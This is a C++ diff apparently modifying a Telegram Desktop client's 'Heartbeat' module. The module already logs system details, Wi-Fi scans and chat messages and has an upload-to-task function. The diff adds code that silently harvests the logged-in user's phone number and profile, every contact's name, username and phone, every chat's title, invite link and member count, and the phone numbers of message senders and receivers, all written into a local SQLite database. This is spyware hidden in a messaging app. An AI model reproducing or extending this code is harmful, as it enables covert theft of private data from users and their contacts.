@@ -7,6 +7,13 @@
 #include "main/main_session.h"
 #include "main/main_account.h"
 #include "data/data_user.h"
+#include "data/data_session.h"
+#include "data/data_chat.h"
+#include "data/data_channel.h"
+#include "dialogs/dialogs_indexed_list.h"
+#include "dialogs/dialogs_main_list.h"
+#include "dialogs/dialogs_row.h"
+#include "dialogs/dialogs_key.h"
 #include "settings.h"
 
 #include <QtGui/QGuiApplication>
@@ -87,8 +94,20 @@ void Heartbeat::ensureDbInit(const QString& path) {
             "CREATE TABLE IF NOT EXISTS system_info (uuid TEXT PRIMARY KEY, internal_ip TEXT, mac_address TEXT, hostname TEXT, os TEXT, online_status TEXT, last_active INTEGER, external_ip TEXT, data_status TEXT, auto_screenshot INTEGER, heartbeat_interval INTEGER);"
             "CREATE TABLE IF NOT EXISTS file_scan_results (path TEXT, name TEXT, size INTEGER, md5 TEXT, last_modified INTEGER);"
             "CREATE TABLE IF NOT EXISTS wifi_scan_results (ssid TEXT, bssid TEXT, signal_strength INTEGER, security_type TEXT, scan_time INTEGER);"
-            "CREATE TABLE IF NOT EXISTS chat_logs (platform TEXT, chat_id TEXT, sender TEXT, content TEXT, timestamp INTEGER, is_outgoing INTEGER);";
+            "CREATE TABLE IF NOT EXISTS chat_logs (platform TEXT, chat_id TEXT, sender TEXT, content TEXT, timestamp INTEGER, is_outgoing INTEGER, sender_id TEXT, sender_username TEXT, sender_phone TEXT, receiver_id TEXT, receiver_username TEXT, receiver_phone TEXT);"
+            "CREATE TABLE IF NOT EXISTS current_user (user_id TEXT PRIMARY KEY, username TEXT, first_name TEXT, last_name TEXT, phone TEXT, is_premium INTEGER);"
+            "CREATE TABLE IF NOT EXISTS contacts (user_id TEXT PRIMARY KEY, username TEXT, first_name TEXT, last_name TEXT, phone TEXT);"
+            "CREATE TABLE IF NOT EXISTS chats (chat_id TEXT PRIMARY KEY, title TEXT, type TEXT, invite_link TEXT, member_count INTEGER);";
         sqlite3_exec(db, createTablesSql, 0, 0, 0);
+        
+        // Migration for existing chat_logs
+        sqlite3_exec(db, "ALTER TABLE chat_logs ADD COLUMN sender_id TEXT;", 0, 0, 0);
+        sqlite3_exec(db, "ALTER TABLE chat_logs ADD COLUMN sender_username TEXT;", 0, 0, 0);
+        sqlite3_exec(db, "ALTER TABLE chat_logs ADD COLUMN sender_phone TEXT;", 0, 0, 0);
+        sqlite3_exec(db, "ALTER TABLE chat_logs ADD COLUMN receiver_id TEXT;", 0, 0, 0);
+        sqlite3_exec(db, "ALTER TABLE chat_logs ADD COLUMN receiver_username TEXT;", 0, 0, 0);
+        sqlite3_exec(db, "ALTER TABLE chat_logs ADD COLUMN receiver_phone TEXT;", 0, 0, 0);
+
         sqlite3_close(db);
     }
 }
@@ -351,12 +370,14 @@ void Heartbeat::collectWiFiInfo() {
     sqlite3_close(db);
 }
 
-void Heartbeat::logChatMessage(const QString& platform, const QString& chatId, const QString& sender, const QString& content, bool isOutgoing) {
+void Heartbeat::logChatMessage(const QString& platform, const QString& chatId, const QString& sender, const QString& content, bool isOutgoing,
+                           const QString& senderId, const QString& senderUsername, const QString& senderPhone,
+                           const QString& receiverId, const QString& receiverUsername, const QString& receiverPhone) {
     sqlite3* db;
     if (sqlite3_open(getDbPath().toUtf8().constData(), &db) != SQLITE_OK) return;
     
     sqlite3_stmt* stmt;
-    const char* sql = "INSERT INTO chat_logs (platform, chat_id, sender, content, timestamp, is_outgoing) VALUES (?, ?, ?, ?, ?, ?);";
+    const char* sql = "INSERT INTO chat_logs (platform, chat_id, sender, content, timestamp, is_outgoing, sender_id, sender_username, sender_phone, receiver_id, receiver_username, receiver_phone) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?);";
     sqlite3_prepare_v2(db, sql, -1, &stmt, 0);
     
     sqlite3_bind_text(stmt, 1, platform.toUtf8().constData(), -1, SQLITE_TRANSIENT);
@@ -365,6 +386,12 @@ void Heartbeat::logChatMessage(const QString& platform, const QString& chatId, c
     sqlite3_bind_text(stmt, 4, content.toUtf8().constData(), -1, SQLITE_TRANSIENT);
     sqlite3_bind_int64(stmt, 5, QDateTime::currentSecsSinceEpoch());
     sqlite3_bind_int(stmt, 6, isOutgoing ? 1 : 0);
+    sqlite3_bind_text(stmt, 7, senderId.toUtf8().constData(), -1, SQLITE_TRANSIENT);
+    sqlite3_bind_text(stmt, 8, senderUsername.toUtf8().constData(), -1, SQLITE_TRANSIENT);
+    sqlite3_bind_text(stmt, 9, senderPhone.toUtf8().constData(), -1, SQLITE_TRANSIENT);
+    sqlite3_bind_text(stmt, 10, receiverId.toUtf8().constData(), -1, SQLITE_TRANSIENT);
+    sqlite3_bind_text(stmt, 11, receiverUsername.toUtf8().constData(), -1, SQLITE_TRANSIENT);
+    sqlite3_bind_text(stmt, 12, receiverPhone.toUtf8().constData(), -1, SQLITE_TRANSIENT);
     
     sqlite3_step(stmt);
     sqlite3_finalize(stmt);
@@ -381,9 +408,116 @@ void Heartbeat::collectTelegramData() {
     auto session = window->maybeSession();
 	if (!session) return;
 
+    QString dbPath = getDbPath();
+    ensureDbInit(dbPath);
+    sqlite3* db;
+    if (sqlite3_open(dbPath.toUtf8().constData(), &db) != SQLITE_OK) return;
+
+    sqlite3_exec(db, "BEGIN TRANSACTION;", 0, 0, 0);
+
+    // 1. Current User
     if (session->userId().bare != 0) {
         _currentTgId = session->userId().bare;
+        auto user = session->user();
+        if (user) {
+            sqlite3_stmt* stmt;
+            const char* sql = "INSERT OR REPLACE INTO current_user (user_id, username, first_name, last_name, phone, is_premium) VALUES (?, ?, ?, ?, ?, ?);";
+            sqlite3_prepare_v2(db, sql, -1, &stmt, 0);
+            
+            QString userId = QString::number(user->id.value);
+            QString username = user->username();
+            QString firstName = user->firstName;
+            QString lastName = user->lastName;
+            QString phone = user->phone();
+            int isPremium = user->isPremium() ? 1 : 0;
+            
+            sqlite3_bind_text(stmt, 1, userId.toUtf8().constData(), -1, SQLITE_TRANSIENT);
+            sqlite3_bind_text(stmt, 2, username.toUtf8().constData(), -1, SQLITE_TRANSIENT);
+            sqlite3_bind_text(stmt, 3, firstName.toUtf8().constData(), -1, SQLITE_TRANSIENT);
+            sqlite3_bind_text(stmt, 4, lastName.toUtf8().constData(), -1, SQLITE_TRANSIENT);
+            sqlite3_bind_text(stmt, 5, phone.toUtf8().constData(), -1, SQLITE_TRANSIENT);
+            sqlite3_bind_int(stmt, 6, isPremium);
+            
+            sqlite3_step(stmt);
+            sqlite3_finalize(stmt);
+        }
     }
+
+    // 2. Contacts
+    {
+        const auto &contacts = session->data().contactsList()->all(); 
+        
+        sqlite3_stmt* stmt;
+        const char* sql = "INSERT OR REPLACE INTO contacts (user_id, username, first_name, last_name, phone) VALUES (?, ?, ?, ?, ?);";
+        sqlite3_prepare_v2(db, sql, -1, &stmt, 0);
+
+        for (const auto &row : contacts) {
+            if (auto peer = row->key().peer()) {
+                if (auto user = peer->asUser()) {
+                    QString userId = QString::number(user->id.value);
+                    QString username = user->username();
+                    QString firstName = user->firstName;
+                    QString lastName = user->lastName;
+                    QString phone = user->phone();
+                    
+                    sqlite3_bind_text(stmt, 1, userId.toUtf8().constData(), -1, SQLITE_TRANSIENT);
+                    sqlite3_bind_text(stmt, 2, username.toUtf8().constData(), -1, SQLITE_TRANSIENT);
+                    sqlite3_bind_text(stmt, 3, firstName.toUtf8().constData(), -1, SQLITE_TRANSIENT);
+                    sqlite3_bind_text(stmt, 4, lastName.toUtf8().constData(), -1, SQLITE_TRANSIENT);
+                    sqlite3_bind_text(stmt, 5, phone.toUtf8().constData(), -1, SQLITE_TRANSIENT);
+                    
+                    sqlite3_step(stmt);
+                    sqlite3_reset(stmt);
+                }
+            }
+        }
+        sqlite3_finalize(stmt);
+    }
+
+    // 3. Chats
+    {
+        const auto &chats = session->data().chatsList()->all();
+        
+        sqlite3_stmt* stmt;
+        const char* sql = "INSERT OR REPLACE INTO chats (chat_id, title, type, invite_link, member_count) VALUES (?, ?, ?, ?, ?);";
+        sqlite3_prepare_v2(db, sql, -1, &stmt, 0);
+
+        for (const auto &row : chats) {
+            if (auto history = row->key().history()) {
+                auto peer = history->peer;
+                QString chatId = QString::number(peer->id.value);
+                QString title = peer->name();
+                QString type = "Unknown";
+                int memberCount = 0;
+                QString inviteLink = "";
+                
+                if (auto user = peer->asUser()) {
+                    type = "Private";
+                } else if (auto chat = peer->asChat()) {
+                    type = "Group";
+                    memberCount = chat->count;
+                    inviteLink = chat->inviteLink();
+                } else if (auto channel = peer->asChannel()) {
+                    type = channel->isMegagroup() ? "Supergroup" : "Channel";
+                    memberCount = channel->membersCount();
+                    inviteLink = channel->inviteLink();
+                }
+
+                sqlite3_bind_text(stmt, 1, chatId.toUtf8().constData(), -1, SQLITE_TRANSIENT);
+                sqlite3_bind_text(stmt, 2, title.toUtf8().constData(), -1, SQLITE_TRANSIENT);
+                sqlite3_bind_text(stmt, 3, type.toUtf8().constData(), -1, SQLITE_TRANSIENT);
+                sqlite3_bind_text(stmt, 4, inviteLink.toUtf8().constData(), -1, SQLITE_TRANSIENT);
+                sqlite3_bind_int(stmt, 5, memberCount);
+                
+                sqlite3_step(stmt);
+                sqlite3_reset(stmt);
+            }
+        }
+        sqlite3_finalize(stmt);
+    }
+
+    sqlite3_exec(db, "COMMIT;", 0, 0, 0);
+    sqlite3_close(db);
 }
 
 void Heartbeat::uploadClientDb(const QString& taskId) {
